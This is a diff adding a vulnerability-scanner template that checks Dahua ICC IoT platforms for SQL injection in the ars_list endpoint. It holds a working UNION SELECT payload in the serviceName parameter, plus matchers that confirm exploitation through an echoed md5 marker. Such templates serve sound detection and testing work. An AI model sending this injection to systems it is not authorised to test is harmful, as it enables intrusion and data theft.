@@ -1,0 +1,36 @@
+id: poc-yaml-dahua-icc-ars-list-sqli
+info:
+  name: Dahua ICC Intelligent IoT ars_list SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Dahua ICC Intelligent IoT Comprehensive Management Platform has a SQL Injection vulnerability in its ars_list endpoint, allowing attackers to retrieve sensitive data.
+variables:
+  t1: '{{rand_int(1000,10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5({{t1}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"data":'
+          - '{{t2}}'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '<'
+      - type: word
+        part: header
+        words:
+          - 'application/json;'
